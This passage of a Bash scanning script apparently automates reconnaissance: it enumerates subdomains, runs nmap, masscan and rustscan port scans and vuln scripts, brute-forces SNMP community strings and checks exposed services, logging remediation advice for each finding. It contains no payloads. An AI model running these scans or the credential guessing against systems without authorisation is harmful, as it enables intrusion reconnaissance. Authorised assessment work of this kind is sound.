        [[ -n "$_wc_ip" ]] && _wc_count=$(( _wc_count + 1 ))
    done
    if [[ $_wc_count -gt 0 ]]; then
        WILDCARD_DNS=true
        log_warn "Wildcard DNS confirmed (${_wc_count}/3 random subs resolved) -- brute-force SKIPPED"
        add_vuln "INFO" "Wildcard DNS Active on ${TARGET}" \
            "Random subdomain probes resolved. Wildcard DNS amplifies false positives." \
            "Review DNS zone for wildcard records." \
            "dig <random>.${TARGET} resolved (${_wc_count}/3)"
    else
        log_ok "No wildcard DNS (0/3 random probes resolved)"
    fi

    # Passive enumeration (always run)
    if command -v subfinder &>/dev/null; then
        run_tool_timeout "subfinder" "${sub_dir}/subfinder.txt" 120 \
            subfinder -d "$TARGET" -silent -all 2>/dev/null || true
    fi
    if command -v sublist3r &>/dev/null; then
        run_tool_timeout "sublist3r" "${sub_dir}/sublist3r_stdout.txt" 120 \
            sublist3r -d "$TARGET" -n -o "${sub_dir}/sublist3r.txt" 2>/dev/null || true
        [[ ! -s "${sub_dir}/sublist3r.txt" ]] && \
            cp "${sub_dir}/sublist3r_stdout.txt" "${sub_dir}/sublist3r.txt" 2>/dev/null || true
    fi
    if command -v amass &>/dev/null; then
        local amass_timeout=120; [[ "$SCAN_PROFILE" == "deep" ]] && amass_timeout=300
        run_tool_timeout "amass" "${sub_dir}/amass.txt" "$amass_timeout" \
            amass enum -passive -d "$TARGET" -o "${sub_dir}/amass_out.txt" 2>/dev/null || true
        [[ -s "${sub_dir}/amass_out.txt" ]] && \
            cat "${sub_dir}/amass_out.txt" >> "${sub_dir}/amass.txt" 2>/dev/null || true
    fi

    # MANDATE 3: Skip brute-force if wildcard DNS
    if [[ "$WILDCARD_DNS" == false ]]; then
        if command -v gobuster &>/dev/null; then
            local wordlist=""
            for _wlp in \
                "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" \
                "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" \
                "/usr/share/wordlists/dns/subdomains-top1million-5000.txt"; do
                [[ -f "$_wlp" ]] && wordlist="$_wlp" && break
            done
            if [[ -z "$wordlist" ]]; then
                printf "www\nmail\nftp\napi\ndev\nstaging\nadmin\nblog\nshop\nm\napp\n" \
                    > "${sub_dir}/builtin_subs.txt"
                wordlist="${sub_dir}/builtin_subs.txt"
            fi
            if [[ -f "$wordlist" ]]; then
                run_tool_timeout "gobuster-dns" "${sub_dir}/gobuster_dns_raw.txt" 180 \
                    gobuster dns -d "$TARGET" -w "$wordlist" -t 50 -q --no-color 2>/dev/null || true
                grep -oE "([a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}" \
                    "${sub_dir}/gobuster_dns_raw.txt" 2>/dev/null \
                    > "${sub_dir}/gobuster_dns.txt" 2>/dev/null || true
            fi
        fi
    else
        log_info "Skipping DNS brute-force (wildcard DNS active)"
    fi

    # Merge passive results
    { for _sf in "${sub_dir}/subfinder.txt" "${sub_dir}/sublist3r.txt" "${sub_dir}/amass.txt" \
                 "${sub_dir}/amass_out.txt" "${sub_dir}/gobuster_dns.txt"; do
        [[ -f "$_sf" ]] && cat "$_sf" 2>/dev/null || true
    done; } | sed 's/\x1b\[[0-9;]*m//g' \
        | grep -oE "([a-zA-Z0-9]([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})" \
        | grep -iE "\.${TARGET}$|^${TARGET}$" \
        | grep -viE "domainincontrol|parking|sedo|bodis|above\.com|afternic|hugedomains" \
        | sort -u > "${sub_dir}/all_subdomains_raw.txt" 2>/dev/null || true

    if [[ -f "${OUTPUT_DIR}/subdomains/from_crtsh.txt" ]]; then
        grep -iE "\.${TARGET}$" "${OUTPUT_DIR}/subdomains/from_crtsh.txt" 2>/dev/null \
            >> "${sub_dir}/all_subdomains_raw.txt" 2>/dev/null || true
    fi
    sort -u "${sub_dir}/all_subdomains_raw.txt" -o "${sub_dir}/all_subdomains_raw.txt" 2>/dev/null || true
    local raw_count=0; { raw_count=$(wc -l < "${sub_dir}/all_subdomains_raw.txt" 2>/dev/null); raw_count=$(( ${raw_count//[^0-9]/} + 0 )); } 2>/dev/null || true
    log_ok "Passive subdomains collected: ${raw_count}"

    # MANDATE 3: Active DNS Validation via dnsx
    if command -v dnsx &>/dev/null && [[ ${raw_count:-0} -gt 0 ]]; then
        log_section "dnsx active DNS validation (${raw_count} candidates)..."
        run_tool_timeout "dnsx-validate" "${sub_dir}/dnsx_resolved.txt" 90 \
            dnsx -l "${sub_dir}/all_subdomains_raw.txt" -silent -a -resp 2>/dev/null || true
        if [[ -s "${sub_dir}/dnsx_resolved.txt" ]]; then
            awk '{print $1}' "${sub_dir}/dnsx_resolved.txt" 2>/dev/null \
                | sort -u > "${sub_dir}/all_subdomains.txt" 2>/dev/null || true
        fi
        local resolved=0; { resolved=$(wc -l < "${sub_dir}/all_subdomains.txt" 2>/dev/null); resolved=$(( ${resolved//[^0-9]/} + 0 )); } 2>/dev/null || true
        log_ok "dnsx resolved: ${resolved}/${raw_count} subdomains"
        local dropped=$(( raw_count - resolved ))
        [[ $dropped -gt 0 ]] && log_info "Dropped ${dropped} (failed DNS resolution)"
    else
        cp "${sub_dir}/all_subdomains_raw.txt" "${sub_dir}/all_subdomains.txt" 2>/dev/null || true
        [[ ${raw_count:-0} -gt 0 ]] && log_warn "dnsx not available -- using unvalidated list"
    fi

    while IFS= read -r sub; do
        [[ -z "$sub" ]] && continue
        echo "$sub" | grep -qiE "domainincontrol|sedoparking|parking|bodis" && continue
        SUBDOMAINS+=("$sub")
    done < "${sub_dir}/all_subdomains.txt" 2>/dev/null || true

    local total=${#SUBDOMAINS[@]}
    log_ok "Total validated subdomains: ${total}"
    [[ ${total:-0} -gt 0 ]] && add_vuln "INFO" "Subdomains Discovered (${total} validated)" \
        "Subdomain enumeration revealed ${total} actively-resolving subdomains." \
        "Audit all subdomains for unnecessary exposure." \
        "$(head -10 "${sub_dir}/all_subdomains.txt" 2>/dev/null | tr '\n' ' ' | cut -c1-200)"

    # httpx probe
    if command -v httpx &>/dev/null && [[ ${total:-0} -gt 0 ]]; then
        run_tool_timeout "httpx-subdomains" "${sub_dir}/live_subdomains_raw.txt" 120 \
            httpx -l "${sub_dir}/all_subdomains.txt" -silent -mc 200,301,302,403,401 \
            -title -tech-detect -status-code -follow-redirects 2>/dev/null || true
        grep -E "^https?://[a-zA-Z0-9]" "${sub_dir}/live_subdomains_raw.txt" 2>/dev/null \
            > "${sub_dir}/live_subdomains.txt" 2>/dev/null || true
        local live_count=0; { live_count=$(wc -l < "${sub_dir}/live_subdomains.txt" 2>/dev/null); live_count=$(( ${live_count//[^0-9]/} + 0 )); } 2>/dev/null || true
        log_ok "Live web subdomains: ${live_count}"
        while IFS= read -r h; do
            local url_only; url_only=$(echo "$h" | awk '{print $1}')
            echo "$url_only" | grep -qE "^https?://[a-zA-Z0-9]" || continue
            echo "$url_only" | grep -qiE "domainincontrol|sedoparking|parking|bodis" && continue
            WEB_TARGETS+=("$url_only")
        done < "${sub_dir}/live_subdomains.txt" 2>/dev/null || true
    fi

    log_ok "Phase 3 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — NETWORK DISCOVERY & HOST DETECTION
# ════════════════════════════════════════════════════════════════════════════════
phase_host_discovery() {
    log_phase 4 "${PHASE_NAMES[4]}"
    local nd_dir="${OUTPUT_DIR}/nmap"

    # Host reachability — try ICMP first, fallback to TCP port 80/443/22
    local _host_up=false
    if ping -c 1 -W 2 "$TARGET" &>/dev/null 2>&1; then
        log_ok "Target ${TARGET} is reachable (ICMP)"
        _host_up=true
        LIVE_HOSTS+=("$TARGET")
    else
        # Try TCP connection to common ports as fallback (firewalls often block ICMP)
        for _p in 80 443 22 8080; do
            if timeout 3 bash -c ">/dev/tcp/${TARGET}/${_p}" 2>/dev/null; then
                log_ok "Target ${TARGET} is reachable (TCP port ${_p})"
                _host_up=true
                LIVE_HOSTS+=("$TARGET")
                break
            fi
        done
        [[ "$_host_up" == false ]] && log_warn "Target ${TARGET} not responding to ICMP or TCP (may be heavily filtered)"
    fi

    # nmap host discovery — stdout captured by run_tool, remove -oN conflict
    if command -v nmap &>/dev/null; then
        run_tool_timeout "nmap-discover" "${nd_dir}/nmap_discover.txt" 30             nmap -sn -T4 --max-retries 1 --host-timeout 20s --reason "$TARGET" 2>/dev/null || true

        # Parse live host from discover output
        if grep -q "Host is up" "${nd_dir}/nmap_discover.txt" 2>/dev/null; then
            log_ok "nmap confirms target ${TARGET} is up"
        fi

        # OS detection attempt (root only)
        if [[ ${EUID:-0} -eq 0 ]]; then
            run_tool_timeout "nmap-os" "${nd_dir}/nmap_os.txt" 90 \
                nmap -O --osscan-guess -T4 -oX "${nd_dir}/nmap_os.xml" "$TARGET" 2>/dev/null || true
            if [[ -f "${nd_dir}/nmap_os.xml" ]]; then
                source <(python3 "$SCRIPT_DIR/nmap_parser.py" "${nd_dir}/nmap_os.xml")
                if [[ "${NMAP_PARSER_FAILURE:-false}" == "true" ]]; then
                    log_warn "[EXPLICIT DEGRADATION] Nmap OS parser BLINDED: ${NMAP_PARSER_REASON:-UNKNOWN}. OS state is UNKNOWN, not SECURE."
                    add_vuln "INFO" "Parser Degradation: Nmap OS XML Corrupt" \
                        "The nmap_parser.py engine failed to parse OS detection XML. Reason: ${NMAP_PARSER_REASON:-UNKNOWN}. Target OS state is UNKNOWN. This is NOT a clean scan — the scanner's sensory organ was blinded." \
                        "Re-run scan. If persistent, WAF may be corrupting Nmap XML output." \
                        "PARSER_FAILURE: ${NMAP_PARSER_REASON:-UNKNOWN}"
                elif [[ -n "${NMAP_OS_GUESS:-}" && "$NMAP_OS_GUESS" != "Unknown" ]]; then
                    log_ok "OS detected (Structured Data): ${NMAP_OS_GUESS}"
                    add_vuln "INFO" "Operating System Detected" \
                        "Remote OS fingerprinting revealed the target OS." \
                        "Enable firewall to block OS fingerprinting probes." \
                        "$NMAP_OS_GUESS"
                fi
            fi
        fi
    fi

    # arp-scan (local network)
    if command -v arp-scan &>/dev/null && [[ ${EUID:-0} -eq 0 ]]; then
        run_tool_timeout "arp-scan" "${nd_dir}/arp_scan.txt" 30 \
            arp-scan --localnet 2>/dev/null || true
    fi

    # masscan quick check
    if command -v masscan &>/dev/null && [[ ${EUID:-0} -eq 0 ]]; then
        run_tool_timeout "masscan-discover" "${OUTPUT_DIR}/masscan/quick_check_stdout.log" 30 \
            masscan "$TARGET" -p 80,443,22,21 --rate 1000 \
            -oL "${OUTPUT_DIR}/masscan/quick_check.txt" 2>/dev/null || true
    fi

    log_ok "Phase 4 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — FULL TCP PORT SCANNING
# ════════════════════════════════════════════════════════════════════════════════
phase_tcp_scan() {
    log_phase 5 "${PHASE_NAMES[5]}"
    local nmap_dir="${OUTPUT_DIR}/nmap"

    # PROXY GUARD: RustScan uses raw sockets — skip under proxychains/torsocks
    if [[ "$PROXY_TYPE" == "proxychains" || "$PROXY_TYPE" == "torsocks" ]]; then
        log_info "Skipping RustScan (raw sockets incompatible with ${PROXY_TYPE})"
    elif command -v rustscan &>/dev/null; then
        log_info "RustScan: fast port discovery..."
        local rs_timeout; rs_timeout=$(proxy_timeout 180); [[ "$SCAN_PROFILE" == "quick" ]] && rs_timeout=$(proxy_timeout 60)
        run_tool_timeout "rustscan" "${OUTPUT_DIR}/rustscan/ports.txt" "$rs_timeout" \
            rustscan -a "$TARGET" --ulimit 5000 -r 1-65535 \
            -- -sV -sC --script-timeout 30s 2>/dev/null || true
        if [[ -f "${OUTPUT_DIR}/rustscan/ports.txt" ]]; then
            OPEN_PORTS=$(grep -oE "^[0-9]+/tcp" "${OUTPUT_DIR}/rustscan/ports.txt" 2>/dev/null \
                | cut -d/ -f1 | sort -un | tr '\n' ',' | sed 's/,$//' || echo "")
        fi
    fi

    local -a nmap_flags=(-sV -sC -T4)
    local -a port_range=(--top-ports 1000)
    local nmap_timeout=120
    case "$SCAN_PROFILE" in
        deep)    port_range=(-p-); nmap_flags=(-sV -sC -T4 -A); nmap_timeout=900 ;;
        standard) port_range=(--top-ports 5000); nmap_timeout=360 ;;
        quick)   port_range=(--top-ports 200); nmap_flags=(-sV -T4); nmap_timeout=120 ;;
    esac

    # PROXY GUARD: Force TCP connect scan (-sT) under proxychains/torsocks
    # Raw SYN scan (-sS) bypasses the proxy and leaks real IP
    if [[ "$PROXY_TYPE" == "proxychains" || "$PROXY_TYPE" == "torsocks" ]]; then
        nmap_flags=(-sT -sV -T3)  # -sT for TCP connect, -T3 for slower timing
        [[ "$SCAN_PROFILE" == "deep" ]] && nmap_flags=(-sT -sV -sC -T3 -A)
        log_info "Nmap forced to -sT (TCP connect) for proxy compatibility"
    fi
    nmap_timeout=$(proxy_timeout $nmap_timeout)

    run_tool_timeout "nmap-tcp" "${nmap_dir}/nmap_tcp.txt" "$nmap_timeout" \
        nmap "${nmap_flags[@]}" "${port_range[@]}" \
        -oX "${nmap_dir}/nmap_tcp.xml" \
        "$TARGET" 2>/dev/null || true

    if [[ -f "${nmap_dir}/nmap_tcp.xml" ]]; then
        source <(python3 "$SCRIPT_DIR/nmap_parser.py" "${nmap_dir}/nmap_tcp.xml")
        if [[ "${NMAP_PARSER_FAILURE:-false}" == "true" ]]; then
            log_warn "[EXPLICIT DEGRADATION] Nmap TCP parser BLINDED: ${NMAP_PARSER_REASON:-UNKNOWN}. Port state is UNKNOWN, not SECURE."
            add_vuln "INFO" "Parser Degradation: Nmap TCP XML Corrupt" \
                "The nmap_parser.py engine failed to parse TCP scan XML. Reason: ${NMAP_PARSER_REASON:-UNKNOWN}. Port state is UNKNOWN." \
                "Re-run scan. Check if WAF is corrupting Nmap XML output." \
                "PARSER_FAILURE: ${NMAP_PARSER_REASON:-UNKNOWN}"
        else
            log_ok "Nmap reported open TCP ports (Structured Data): ${OPEN_PORTS:-none}"
            [[ -z "$WEB_PORTS" && -n "$OPEN_PORTS" ]] && [[ "$OPEN_PORTS" == *"80"* || "$OPEN_PORTS" == *"443"* ]] && WEB_PORTS="80,443"
        fi
    fi

    # MANDATE 4: Secondary Port Verification
    if [[ -n "${OPEN_PORTS:-}" ]]; then
        log_section "Secondary port verification (socket check)..."
        local -a _nmap_arr=()
        IFS=',' read -ra _nmap_arr <<< "$OPEN_PORTS"
        VERIFIED_PORTS=()
        local -a _spoofed=()
        local verify_log="${nmap_dir}/port_verification.txt"
        : > "$verify_log" 2>/dev/null || true

        for _port in "${_nmap_arr[@]}"; do
            _port=$(( ${_port//[^0-9]/} + 0 ))
            [[ $_port -le 0 || $_port -gt 65535 ]] && continue
            local _verified=false
            # PROXY GUARD: /dev/tcp bypasses SOCKS proxy — use nc only under proxychains
            if [[ "$PROXY_TYPE" != "proxychains" && "$PROXY_TYPE" != "torsocks" ]]; then
                if timeout 3 bash -c "</dev/tcp/${TARGET}/${_port}" 2>/dev/null; then
                    _verified=true
                fi
            fi
            if [[ "$_verified" != true ]] && command -v nc &>/dev/null; then
                local _nc_timeout=2; [[ "$PROXY_MODE" == true ]] && _nc_timeout=5
                if nc -z -w $_nc_timeout "$TARGET" "$_port" 2>/dev/null; then
                    _verified=true
                fi
            fi
            if [[ "$_verified" == true ]]; then
                VERIFIED_PORTS+=("$_port")
                echo "VERIFIED: port ${_port}/tcp" >> "$verify_log"
            else
                _spoofed+=("$_port")
                echo "SPOOFED:  port ${_port}/tcp" >> "$verify_log"
            fi
        done

        local v_count=${#VERIFIED_PORTS[@]}
        local s_count=${#_spoofed[@]}
        log_ok "Verified: ${v_count}/${#_nmap_arr[@]} ports (${s_count} spoofed)"
        if [[ $v_count -gt 0 ]]; then
            OPEN_PORTS=$(printf '%s,' "${VERIFIED_PORTS[@]}" | sed 's/,$//')
        fi
        if [[ $s_count -gt 0 ]]; then
            local spoofed_list; spoofed_list=$(printf '%s,' "${_spoofed[@]}" | sed 's/,$//')
            log_warn "Spoofed ports excluded: ${spoofed_list}"
            add_vuln "INFO" "Firewall-Spoofed Ports (${s_count})" \
                "Nmap reported ${s_count} port(s) open but socket verification failed." \
                "Verify firewall rules. Excluded from aggressive scanning." \
                "Spoofed: ${spoofed_list}"
        fi
        local -a _vweb=()
        for _vp in "${VERIFIED_PORTS[@]}"; do
            grep -qE "^${_vp}/tcp.*open.*http" "${nmap_dir}/nmap_tcp.txt" 2>/dev/null && _vweb+=("$_vp")
        done
        [[ ${#_vweb[@]} -gt 0 ]] && WEB_PORTS=$(printf '%s,' "${_vweb[@]}" | sed 's/,$//')
        log_ok "Verified web ports: ${WEB_PORTS:-none}"
    fi

    # masscan full — PROXY GUARD: masscan uses raw sockets, skip under proxy
    if [[ "$PROXY_TYPE" == "proxychains" || "$PROXY_TYPE" == "torsocks" ]]; then
        log_info "Skipping masscan (raw sockets incompatible with ${PROXY_TYPE})"
    elif command -v masscan &>/dev/null && [[ ${EUID:-0} -eq 0 ]]; then
        local masscan_rate=2000; [[ "$SCAN_PROFILE" == "deep" ]] && masscan_rate=10000
        local masscan_t; masscan_t=$(proxy_timeout 300)
        run_tool_timeout "masscan-full" "${OUTPUT_DIR}/masscan/full_stdout.log" "$masscan_t" \
            masscan "$TARGET" -p1-65535 --rate "$masscan_rate" \
            -oL "${OUTPUT_DIR}/masscan/full.txt" 2>/dev/null || true
    fi

    # NSE vuln scripts on VERIFIED ports only
    if command -v nmap &>/dev/null && [[ -n "${OPEN_PORTS:-}" ]]; then
        local vuln_t=180
        [[ "$SCAN_PROFILE" == "standard" ]] && vuln_t=300
        [[ "$SCAN_PROFILE" == "deep"     ]] && vuln_t=600
        run_tool_timeout "nmap-vuln" "${nmap_dir}/nmap_vuln.txt" "$vuln_t" \
            nmap -sV --script vuln,safe,auth -p "$OPEN_PORTS" \
            "$TARGET" 2>/dev/null || true
        local vf="${nmap_dir}/nmap_vuln.txt"
        if [[ -f "$vf" ]]; then
            grep -qiE "shellshock|CVE-2014-6271" "$vf" && \
                add_vuln "CRITICAL" "Shellshock (CVE-2014-6271)" \
                    "Bash RCE via crafted environment variables." \
                    "Update bash immediately." "nmap vuln: shellshock detected"
            grep -qiE "ms17-010|EternalBlue" "$vf" && \
                add_vuln "CRITICAL" "EternalBlue MS17-010 (SMB RCE)" \
                    "Wormable SMB RCE used by WannaCry/NotPetya." \
                    "Apply MS17-010 patch, disable SMBv1." "nmap vuln: ms17-010"
            grep -qiE "CVE-2019-0708|BlueKeep" "$vf" && \
                add_vuln "CRITICAL" "BlueKeep (CVE-2019-0708)" \
                    "Pre-auth wormable RCE in Windows RDP." \
                    "Apply KB4499175, disable RDP if unused." "nmap vuln: BlueKeep"
            grep -qiE "vsftpd.*backdoor|CVE-2011-2523" "$vf" && \
                add_vuln "CRITICAL" "vsFTPd 2.3.4 Backdoor (CVE-2011-2523)" \
                    "Backdoor opens shell on port 6200." \
                    "Update vsFTPd immediately." "nmap vuln: vsftpd backdoor"
        fi
    fi

    log_ok "Phase 5 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — UDP PORT SCANNING
# ════════════════════════════════════════════════════════════════════════════════
phase_udp_scan() {
    log_phase 6 "${PHASE_NAMES[6]}"
    local nmap_dir="${OUTPUT_DIR}/nmap"

    if [[ $EUID -ne 0 ]]; then
        log_warn "UDP scan requires root. Skipping."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    # FIX: Use array for UDP ports so --top-ports 200 splits correctly with IFS=$'\n\t'
    local -a udp_args=()
    if [[ "$SCAN_PROFILE" == "deep" ]]; then
        udp_args=(--top-ports 200)
    else
        udp_args=(-p "U:53,67,68,69,111,123,137,138,139,161,162,177,389,445,500,514,623,631,1194,1900,4500,5353")
    fi
    local udp_timeout=180; [[ "$SCAN_PROFILE" == "deep" ]] && udp_timeout=600

    run_tool_timeout "nmap-udp" "${nmap_dir}/nmap_udp.txt" "$udp_timeout" \
        nmap -sU -sV --version-intensity 2 -T4 "${udp_args[@]}" \
        "$TARGET" 2>/dev/null || true

    local uf="${nmap_dir}/nmap_udp.txt"
    if [[ -f "$uf" ]]; then
        # SNMP check
        grep -q "161/udp.*open" "$uf" && \
            add_vuln "HIGH" "SNMP Service Exposed (UDP 161)" \
                "SNMP is open and may allow information disclosure, device configuration changes, or DoS via default community strings." \
                "Disable SNMP if unused. Use SNMPv3 with authentication. Restrict by ACL." \
                "nmap: 161/udp open snmp"

        # DNS open (potential amplification)
        grep -q "53/udp.*open" "$uf" && \
            add_vuln "MEDIUM" "DNS Open Resolver (UDP 53)" \
                "Open DNS resolver can be abused for DNS amplification DDoS attacks." \
                "Restrict recursive DNS queries. Implement rate limiting." \
                "nmap: 53/udp open dns"

        # TFTP
        grep -q "69/udp.*open" "$uf" && \
            add_vuln "HIGH" "TFTP Service Open (UDP 69)" \
                "TFTP has no authentication. Attackers can download/upload files remotely." \
                "Disable TFTP. Use SFTP/SCP for file transfers." \
                "nmap: 69/udp open tftp"

        # NFS / portmapper
        grep -qE "111/udp.*open|2049/udp" "$uf" && \
            add_vuln "HIGH" "NFS/Portmapper Exposed (UDP 111/2049)" \
                "NFS can allow unauthenticated file system access." \
                "Restrict NFS exports, require Kerberos auth, firewall 111/2049." \
                "nmap: 111/udp open portmapper"
    fi

    # SNMP community string brute — fix dict path with fallbacks
    if command -v onesixtyone &>/dev/null && grep -q "161/udp.*open" "${nmap_dir}/nmap_udp.txt" 2>/dev/null; then
        local snmp_dict=""
        for d in /usr/share/doc/onesixtyone/dict.txt \
                  /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
                  /usr/share/wordlists/metasploit/snmp_default_pass.txt; do
            [[ -f "$d" ]] && snmp_dict="$d" && break
        done
        # Create built-in fallback if no dict found
        if [[ -z "$snmp_dict" ]]; then
            snmp_dict="${OUTPUT_DIR}/snmp/fallback_communities.txt"
            mkdir -p "${OUTPUT_DIR}/snmp"
            printf "public\nprivate\ncommunity\nmanager\nmonitor\nread\nwrite\ndefault\n" \
                > "$snmp_dict"
        fi
        mkdir -p "${OUTPUT_DIR}/snmp"
        run_tool_timeout "onesixtyone" "${OUTPUT_DIR}/snmp/communities.txt" 30 \
            onesixtyone -c "$snmp_dict" "$TARGET" 2>/dev/null || true
        if [[ -f "${OUTPUT_DIR}/snmp/communities.txt" ]] && \
           grep -vE "^#|^$" "${OUTPUT_DIR}/snmp/communities.txt" 2>/dev/null | grep -qE "."; then
            add_vuln "CRITICAL" "SNMP Default Community String Accepted" \
                "SNMP community string (public/private) was accepted. Full device info and possible config read/write." \
                "Change community strings. Implement SNMPv3 with auth and privacy. Block UDP 161 externally." \
                "$(head -3 "${OUTPUT_DIR}/snmp/communities.txt" 2>/dev/null)"
        fi
    fi

    log_ok "Phase 6 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — SERVICE DETECTION & BANNER GRABBING
# ════════════════════════════════════════════════════════════════════════════════
phase_service_detect() {
    log_phase 7 "${PHASE_NAMES[7]}"
    local raw_dir="${OUTPUT_DIR}/raw_logs"
    local nmap_dir="${OUTPUT_DIR}/nmap"

    # Grab banners with nc
    local common_ports=(21 22 23 25 80 110 143 443 445 993 995 3306 3389 5432 5900 6379 8080 8443 27017)
    for port in "${common_ports[@]}"; do
        if echo "$OPEN_PORTS" | grep -qE "(^|,)${port}(,|$)"; then
            (echo "" | timeout 5 nc -w 3 "$TARGET" "$port" 2>/dev/null \
                || true) > "${raw_dir}/banner_${port}.txt" 2>/dev/null || true
            local banner; banner=$(head -3 "${raw_dir}/banner_${port}.txt" 2>/dev/null || echo "")
            [[ -n "$banner" ]] && log_info "Banner port ${port}: $(echo "$banner" | head -1)"
        fi
    done

    # SSH version check
    if echo "$OPEN_PORTS" | grep -qE "(^|,)22(,|$)"; then
        run_tool_timeout "nmap-ssh" "${nmap_dir}/nmap_ssh.txt" 30 \
            nmap -sV -p 22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey \
            "$TARGET" 2>/dev/null || true
        local sf="${nmap_dir}/nmap_ssh.txt"
        if [[ -f "$sf" ]]; then
            grep -qiE "openssh.*[1-7]\." "$sf" && \
                add_vuln "MEDIUM" "Outdated OpenSSH Version Detected" \
                    "Old SSH versions contain known vulnerabilities." \
                    "Upgrade to the latest OpenSSH release." \
                    "$(grep -i 'openssh' "$sf" | head -1)"
            grep -qiE "password.*enabled|publickey,password" "$sf" && \
                add_vuln "MEDIUM" "SSH Password Authentication Enabled" \
                    "SSH allows password authentication which is susceptible to brute-force attacks." \
                    "Disable password auth: PasswordAuthentication no in sshd_config. Use key-based auth only." \
                    "$(grep -i 'password' "$sf" | head -1)"
            grep -qiE "permit.*root.*yes|root.*login.*yes" "$sf" && \
                add_vuln "HIGH" "SSH Root Login Permitted" \
                    "Direct root login over SSH bypasses audit trails and allows unrestricted access if cracked." \
                    "Set PermitRootLogin no in /etc/ssh/sshd_config." \
                    "sshd_config: PermitRootLogin yes"
        fi
    fi

    # FTP checks
    if echo "$OPEN_PORTS" | grep -qE "(^|,)21(,|$)"; then
        run_tool_timeout "nmap-ftp" "${nmap_dir}/nmap_ftp.txt" 30 \
            nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor \
            "$TARGET" 2>/dev/null || true
        local ff="${nmap_dir}/nmap_ftp.txt"
        if [[ -f "$ff" ]]; then
            grep -qiE "Anonymous FTP login allowed|230 Login successful" "$ff" && \
                add_vuln "HIGH" "FTP Anonymous Login Allowed" \
                    "Anonymous FTP access exposes files without authentication." \
                    "Disable anonymous FTP login. Enforce authentication for all FTP access." \
                    "FTP 230: Anonymous login allowed"
            grep -qi "ftp-bounce.*allowed" "$ff" && \
                add_vuln "MEDIUM" "FTP Bounce Attack Possible" \
                    "FTP PORT command allows using this server as a proxy to scan or attack other systems." \
                    "Disable PORT mode. Restrict to PASV mode only." \
                    "nmap ftp-bounce: allowed"
        fi
    fi

    # Telnet
    if echo "$OPEN_PORTS" | grep -qE "(^|,)23(,|$)"; then
        add_vuln "HIGH" "Telnet Service Running (Port 23)" \
            "Telnet transmits credentials and data in plaintext. Susceptible to MITM attacks." \
            "Disable Telnet. Use SSH instead. If unavoidable, use within VPN only." \
            "23/tcp open telnet"
    fi

    # RDP checks
    if echo "$OPEN_PORTS" | grep -qE "(^|,)3389(,|$)"; then
        run_tool_timeout "nmap-rdp" "${nmap_dir}/nmap_rdp.txt" 45 \
            nmap -sV -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 \
            "$TARGET" 2>/dev/null || true
        add_vuln "HIGH" "RDP Exposed (Port 3389)" \
            "RDP brute-force attacks are constant on public IPs. BlueKeep (CVE-2019-0708) and DejaBlue allow unauthenticated RCE." \
            "Put RDP behind VPN. Enable NLA. Apply all Windows patches. Restrict by IP." \
            "3389/tcp open ms-wbt-server"
    fi

    # Database exposure checks
    local db_ports=("3306:MySQL" "5432:PostgreSQL" "27017:MongoDB" "6379:Redis" "9200:Elasticsearch" "5984:CouchDB")
    for entry in "${db_ports[@]}"; do
        local port="${entry%%:*}"; local name="${entry##*:}"
        if echo "$OPEN_PORTS" | grep -qE "(^|,)${port}(,|$)"; then
            add_vuln "CRITICAL" "${name} Database Exposed (Port ${port})" \
                "${name} is accessible from the network without VPN. Attackers can dump all data or achieve RCE." \
                "Bind ${name} to localhost only (bind 127.0.0.1). Firewall port ${port}. Require authentication." \
                "${port}/tcp open — ${name} network accessible"
        fi
    done

    # VNC check
    if echo "$OPEN_PORTS" | grep -qE "(^|,)5900(,|$)"; then
        run_tool_timeout "nmap-vnc" "${nmap_dir}/nmap_vnc.txt" 30 \
            nmap -sV -p 5900 --script vnc-info \
            "$TARGET" 2>/dev/null || true
        add_vuln "HIGH" "VNC Service Exposed (Port 5900)" \
            "VNC provides full desktop access. Often poorly secured with weak/no passwords." \
            "Disable VNC or restrict to VPN. Use strong passwords. Enable encryption." \
            "5900/tcp open vnc"
    fi

    # SMTP relay check + user enumeration
    if echo "$OPEN_PORTS" | grep -qE "(^|,)25(,|$)"; then
        run_tool_timeout "nmap-smtp" "${nmap_dir}/nmap_smtp.txt" 30 \
            nmap -sV -p 25 --script smtp-open-relay,smtp-enum-users,smtp-commands \
            "$TARGET" 2>/dev/null || true
        grep -qiE "open relay|mail relay" "${nmap_dir}/nmap_smtp.txt" 2>/dev/null && \
            add_vuln "HIGH" "SMTP Open Mail Relay Detected" \
                "Open relay allows spammers to send email through this server, leading to blacklisting." \
                "Configure SMTP relay restrictions. Require SMTP AUTH." \
                "SMTP open relay confirmed"
        grep -qiE "VRFY|EXPN" "${nmap_dir}/nmap_smtp.txt" 2>/dev/null && \
            add_vuln "MEDIUM" "SMTP VRFY/EXPN User Enumeration Enabled" \
                "SMTP server responds to VRFY/EXPN commands allowing username enumeration." \
                "Disable VRFY and EXPN commands in mail server configuration." \
                "SMTP: VRFY/EXPN commands enabled"
    fi

    log_ok "Phase 7 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — WEB DISCOVERY & HTTP PROBING
# ════════════════════════════════════════════════════════════════════════════════
phase_web_discovery() {
    log_phase 8 "${PHASE_NAMES[8]}"
    local curl_dir="${OUTPUT_DIR}/curl"

    # Build web target list from WEB_TARGETS (already populated in Phase 3)
    # Also add from WEB_PORTS (set in Phase 5 from nmap scan)
